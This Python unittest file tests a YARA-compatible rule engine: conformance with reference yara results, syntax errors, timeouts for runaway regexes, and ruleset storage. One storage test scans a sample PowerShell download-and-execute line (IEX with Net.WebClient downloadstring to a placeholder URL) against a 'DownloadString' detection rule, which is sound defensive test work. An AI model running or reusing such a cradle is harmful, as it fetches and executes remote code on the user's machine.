"""Phase 6: YARA-compatible rule engine, rule set storage and file scans.

``EXPECTED`` was recorded on 2026-11-12 by running ``yara -w`` 4.5.5 with
``fixtures/yara-conformance.yar`` over ``yara_corpus.corpus()``.
"""

import tempfile
import time
import unittest
from pathlib import Path

from garbage_intel.errors import ConflictError, ValidationError
from garbage_intel.modules import yara_engine as ye
from garbage_intel.modules import yara_rules
from garbage_intel.modules.file_intel import analyze_file
from garbage_intel.store import initialize

from tests.yara_corpus import corpus

RULES = (Path(__file__).parent / "fixtures" / "yara-conformance.yar").read_text()
EXPECTED = {
    "aaaa.bin": ["anon_strings", "cond_all", "cond_any", "cond_arith", "cond_count", "cond_defined", "cond_filesize", "cond_for_in", "cond_in", "cond_n_of", "cond_none", "cond_percent", "of_in_range", "tagged", "uses_private"],
    "marks.bin": ["anon_strings", "cond_all", "cond_any", "cond_arith", "cond_count", "cond_defined", "cond_filesize", "cond_for_in", "cond_for_of", "cond_in", "cond_n_of", "cond_none", "cond_offset", "cond_percent", "of_in_range", "tagged", "uses_private"],
    "pe.bin": ["cond_arith", "cond_defined", "cond_filesize", "cond_none", "cond_uint", "hex_basic", "hex_jump", "hex_nibble", "hex_wild", "of_rules", "regex_basic", "text_fullword", "text_nocase", "text_plain", "text_wide", "text_xor"],
    "png.bin": ["cond_arith", "cond_defined", "cond_none", "cond_uint_be"],
    "text.txt": ["cond_arith", "cond_defined", "cond_none", "hex_alt", "hex_jump", "hex_not", "of_rules", "regex_dotall", "regex_nocase", "text_escapes", "text_fullword", "text_nocase", "text_wide_ascii"],
    "tiny.bin": ["cond_arith", "cond_defined", "cond_none"],
    "xorurl.bin": ["cond_arith", "cond_defined", "cond_none", "of_rules", "text_xor_range"],
    "zeros.bin": ["cond_arith", "cond_defined", "cond_filesize", "cond_none"],
}


class ConformanceTests(unittest.TestCase):
    def test_matches_yara_reference(self):
        ruleset = ye.compile_rules(RULES)
        for name, data in corpus().items():
            with self.subTest(file=name):
                result = ye.scan(ruleset, data)
                self.assertEqual(sorted(match["rule"] for match in result["matches"]), EXPECTED[name])

    def test_match_details(self):
        ruleset = ye.compile_rules(RULES)
        result = ye.scan(ruleset, corpus()["marks.bin"])
        tagged = next(match for match in result["matches"] if match["rule"] == "tagged")
        self.assertEqual(tagged["tags"], ["alpha", "beta"])
        self.assertEqual(tagged["meta"], {"author": "test", "score": 7, "ok": True})
        self.assertEqual(tagged["strings"][0]["matches"][0], {"offset": 10, "length": 4, "hex": "4d41524b", "text": "MARK"})
        pe = ye.scan(ruleset, corpus()["pe.bin"])
        xor = next(match for match in pe["matches"] if match["rule"] == "text_xor")
        self.assertEqual(xor["strings"][0]["matches"][0]["offset"], 200)
        self.assertNotIn("priv_base", {match["rule"] for match in result["matches"]})

    def test_overlapping_and_fullword(self):
        ruleset = ye.compile_rules('rule a { strings: $a = "aa" $b = "cmd" fullword condition: #a == 3 and #b == 1 }')
        self.assertEqual([match["rule"] for match in ye.scan(ruleset, b"aaaa cmd xcmd cmdx")["matches"]], ["a"])

    def test_global_rules_gate_the_set(self):
        source = 'global rule small { condition: filesize < 10 } rule any_a { strings: $a = "a" condition: $a }'
        self.assertEqual([m["rule"] for m in ye.scan(ye.compile_rules(source), b"aaa")["matches"]], ["small", "any_a"])
        self.assertEqual(ye.scan(ye.compile_rules(source), b"a" * 20)["matches"], [])


class SyntaxTests(unittest.TestCase):
    def assertRejects(self, source, fragment, line=None):
        with self.assertRaises(ye.YaraError) as caught:
            ye.compile_rules(source)
        self.assertIn(fragment, str(caught.exception))
        if line is not None:
            self.assertEqual(caught.exception.line, line)

    def test_errors_are_specific(self):
        self.assertRejects('import "pe"\nrule a { condition: true }', "modules")
        self.assertRejects("rule a {\n condition:\n  missing_rule\n}", "unknown identifier 'missing_rule'", 3)
        self.assertRejects("rule a { condition: true } rule a { condition: true }", "duplicate rule")
        self.assertRejects('rule a { strings: $a = { 41 [-] 42 } condition: $a }', "unbounded jump")
        self.assertRejects('rule a { strings: $a = { [2] 41 } condition: $a }', "start or end with a jump")
        self.assertRejects('rule a { strings: $a = /(a+)+b/ condition: $a }', "nested unbounded repetition")
        self.assertRejects('rule a { strings: $a = "x" base64 condition: $a }', "base64")
        self.assertRejects('rule a { strings: $a = "x" condition: $b }', "undefined string $b")
        self.assertRejects('rule a { condition: $ }', "anonymous")
        self.assertRejects('rule a { strings: $a = "x" xor nocase condition: $a }', "xor and nocase")
        self.assertRejects("", "empty")

    def test_modulo_is_not_a_percentage(self):
        ruleset = ye.compile_rules('rule a { strings: $a = "x" $b = "y" condition: filesize % 2 == 0 and 50% of them }')
        self.assertEqual(len(ye.scan(ruleset, b"xx")["matches"]), 1)
        self.assertEqual(ye.scan(ruleset, b"xxx")["matches"], [])

    def test_undefined_values(self):
        ruleset = ye.compile_rules(
            "rule a { condition: not (uint32(100) == 0) }\n"
            "rule b { condition: uint32(100) == 0 or true }\n"
            "rule c { condition: not defined (filesize \\ 0) }"
        )
        self.assertEqual([m["rule"] for m in ye.scan(ruleset, b"abc")["matches"]], ["b", "c"])


class IsolationTests(unittest.TestCase):
    def test_runaway_scan_is_stopped(self):
        source = "rule slow { strings: $a = /[a-z]*[a-z]*[a-z]*[a-z]*[a-z]*X/ condition: $a }"
        started = time.monotonic()
        outcome = ye.run_isolated([("id", "slow", source)], b"a" * 400_000, timeout=1.5)
        self.assertTrue(outcome["timed_out"])
        self.assertIn("stopped after", outcome["rulesets"][0]["error"])
        self.assertLess(time.monotonic() - started, 10)

    def test_isolated_scan_returns_results(self):
        outcome = ye.run_isolated([("id", "set", 'rule hit { strings: $a = "needle" condition: $a }')], b"hay needle hay")
        self.assertFalse(outcome["timed_out"])
        self.assertEqual(outcome["rulesets"][0]["matches"][0]["rule"], "hit")


class StorageTests(unittest.TestCase):
    def setUp(self):
        self.directory = tempfile.TemporaryDirectory()
        self.database = str(Path(self.directory.name) / "yara.sqlite3")
        initialize(self.database)

    def tearDown(self):
        self.directory.cleanup()

    def test_crud_and_validation(self):
        created = yara_rules.create_ruleset(self.database, name="Droppers", source='rule mz { condition: uint16(0) == 0x5A4D }')
        self.assertEqual(created["rule_names"], ["mz"])
        with self.assertRaises(ConflictError):
            yara_rules.create_ruleset(self.database, name="Droppers", source="rule x { condition: true }")
        with self.assertRaises(ValidationError):
            yara_rules.create_ruleset(self.database, name="Broken", source="rule { condition: true }")
        updated = yara_rules.update_ruleset(self.database, created["id"], enabled=False)
        self.assertFalse(updated["enabled"])
        self.assertEqual(yara_rules.list_rulesets(self.database)["total"], 1)
        self.assertNotIn("source", yara_rules.list_rulesets(self.database)["items"][0])
        checked = yara_rules.check_source("rule a {\n condition: nope\n}")
        self.assertFalse(checked["valid"])
        self.assertEqual(checked["line"], 2)
        yara_rules.delete_ruleset(self.database, created["id"])
        self.assertEqual(yara_rules.list_rulesets(self.database)["total"], 0)

    def test_enabled_sets_run_on_new_analyses(self):
        yara_rules.create_ruleset(
            self.database,
            name="Scripts",
            source='rule ps_download : script { meta: author = "lab" strings: $a = "DownloadString" nocase condition: $a }',
        )
        yara_rules.create_ruleset(self.database, name="Off", source="rule always { condition: true }", enabled=False)
        analysis = analyze_file(self.database, data=b"IEX (New-Object Net.WebClient).downloadstring('http://x')", filename="a.ps1")
        self.assertEqual(analysis["yara"]["match_count"], 1)
        self.assertEqual(analysis["yara"]["rulesets"][0]["matches"][0]["rule"], "ps_download")
        self.assertIn("yara-match", {item["code"] for item in analysis["findings"]})
        self.assertEqual(len(analysis["yara"]["rulesets"]), 1)
        tested = yara_rules.test_source('rule t { strings: $a = "Net.WebClient" condition: $a }', b"(New-Object Net.WebClient)")
        self.assertEqual(tested["result"]["matches"][0]["strings"][0]["matches"][0]["offset"], 12)


if __name__ == "__main__":
    unittest.main()
